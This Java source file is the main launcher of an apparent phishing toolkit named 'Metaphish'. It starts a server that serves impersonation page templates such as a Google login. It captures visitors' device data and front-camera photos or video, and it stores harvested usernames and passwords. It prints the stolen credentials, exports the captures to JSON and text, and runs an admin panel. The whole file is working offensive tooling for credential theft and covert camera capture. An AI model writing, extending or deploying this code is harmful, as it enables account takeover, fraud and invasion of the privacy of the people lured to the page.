package com.metaphish;

import com.metaphish.config.AppConfig;
import com.metaphish.module.DataCapture;
import com.metaphish.module.ExportManager;
import com.metaphish.module.FormCapture;
import com.metaphish.module.ReportGenerator;
import com.metaphish.server.MetaphishServer;
import com.metaphish.util.ArgsParser;
import com.metaphish.util.Logger;
import com.metaphish.util.TerminalOutput;

import java.io.PrintStream;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.nio.charset.StandardCharsets;
import java.util.Enumeration;
import java.util.List;
import java.util.Map;

public final class Metaphish {

    public static void main(String[] Arguments) throws Exception {
        System.setOut(new PrintStream(System.out, true, StandardCharsets.UTF_8));
        System.setErr(new PrintStream(System.err, true, StandardCharsets.UTF_8));
        TerminalOutput.Banner();

        ArgsParser Args = ArgsParser.Parse(Arguments);

        if (Args.Has("h", "help")) {
            Args.PrintHelp();
            return;
        }

        String ConfigFile = Args.Get("metaphish.properties", "c", "config");
        AppConfig Config = new AppConfig(ConfigFile);

        if (Args.Has("s", "host"))           Config.Override("host",           Args.Get("0.0.0.0",   "s", "host"));
        if (Args.Has("p", "port"))           Config.Override("port",           Args.Get("8080",       "p", "port"));
        if (Args.Has("t", "template"))       Config.Override("template",       Args.Get("google",     "t", "template"));
        if (Args.Has("u", "username"))       Config.Override("username",       Args.Get("admin",      "u", "username"));
        if (Args.Has("P", "password"))       Config.Override("password",       Args.Get("metaphish",  "P", "password"));
        if (Args.Has("ssl"))                 Config.Override("ssl",            "true");
        if (Args.Has("log-level"))           Config.Override("log-level",      Args.Get("INFO",       "log-level"));
        if (Args.Has("camera-mode"))         Config.Override("camera-mode",    Args.Get("front",      "camera-mode"));
        if (Args.Has("video-source"))        Config.Override("video-source",   Args.Get("front",      "video-source"));
        if (Args.Has("video-duration"))      Config.Override("video-duration", Args.Get("10",         "video-duration"));

        boolean Verbose = Args.Has("v", "verbose");

        Logger.Configure(Config.LogLevel, Verbose, true, Config.LogFilePath, 1000);

        DataCapture DeviceCapture = new DataCapture(Config.CaptureFilePath);
        FormCapture FormCaptureStore = new FormCapture(Config.FormCaptureFilePath);
        ExportManager Exporter = new ExportManager(DeviceCapture, FormCaptureStore, Config.ReportDirectory);
        ReportGenerator Reporter = new ReportGenerator(DeviceCapture, FormCaptureStore, Config.ReportDirectory, Config.ImagesDirectory);

        if (Args.Has("export")) {
            Logger.Info("Exporting all captures...");
            try {
                String JsonFile = Exporter.ExportToJson();
                String TxtFile = Exporter.ExportToTxt();
                Logger.Success("JSON export: " + JsonFile);
                Logger.Success("TXT export:  " + TxtFile);
            } catch (Exception Error) {
                Logger.Error("Export failed: " + Error.getMessage());
            }
            Logger.Shutdown();
            return;
        }

        if (Args.Has("show-captures")) {
            List<Map<String, String>> Captures = DeviceCapture.LoadAll();
            List<Map<String, String>> Forms = FormCaptureStore.LoadAll();
            Logger.Info("Total device captures: " + Captures.size());
            Logger.Info("Total credential captures: " + Forms.size());
            Logger.Separator();
            int Index = 1;
            for (Map<String, String> Capture : Captures) {
                Logger.PrintCapture(Index++, Capture);
            }
            if (!Forms.isEmpty()) {
                Logger.Info("Credentials:");
                for (Map<String, String> Form : Forms) {
                    Logger.Credential(Form.getOrDefault("Username", ""), Form.getOrDefault("Password", ""));
                }
            }
            Logger.Shutdown();
            return;
        }

        if (Args.Has("clear-captures")) {
            DeviceCapture.Clear();
            FormCaptureStore.Clear();
            Logger.Success("All capture data cleared.");
            Logger.Shutdown();
            return;
        }

        MetaphishServer Server = new MetaphishServer(Config);
        Server.Start();

        String Protocol        = Config.SslEnabled ? "https" : "http";
        String DetectedLanIp   = DetectLanIpAddress();
        String Host            = Config.ServerHost.equals("0.0.0.0")
                ? (DetectedLanIp != null ? DetectedLanIp : "YOUR_IP")
                : Config.ServerHost;

        Logger.Info("Server started on port " + Config.ServerPort);
        Logger.Info("Template: " + Config.DefaultTemplate + " | Camera: " + Config.CameraMode
                + (Config.CameraMode.equals("video") ? " (" + Config.VideoDuration + "s)" : ""));
        Logger.Link("Phishing Page", Protocol + "://" + Host + ":" + Config.ServerPort + "/");
        Logger.Link("Admin Panel  ", Protocol + "://" + Host + ":" + Config.ServerPort + "/status");
        Logger.Link("Admin Login  ", Protocol + "://" + Host + ":" + Config.ServerPort + "/status/login");
        Logger.Info("Admin credentials → " + Config.AdminUsername + " / " + Config.AdminPassword);
        Logger.Info("Press Ctrl+C to stop.");

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            Logger.Info("Shutting down...");
            Server.Stop();
            Logger.Shutdown();
        }, "ShutdownHook"));

        Thread.currentThread().join();
    }

    private static String DetectLanIpAddress() {
        try {
            Enumeration<NetworkInterface> Interfaces = NetworkInterface.getNetworkInterfaces();
            while (Interfaces.hasMoreElements()) {
                NetworkInterface Interface = Interfaces.nextElement();
                if (Interface.isLoopback() || !Interface.isUp()) continue;
                Enumeration<InetAddress> Addresses = Interface.getInetAddresses();
                while (Addresses.hasMoreElements()) {
                    InetAddress Address = Addresses.nextElement();
                    if (!Address.isLoopbackAddress() && Address.getHostAddress().contains(".")) {
                        return Address.getHostAddress();
                    }
                }
            }
        } catch (Exception Ignored) {}
        return null;
    }
}
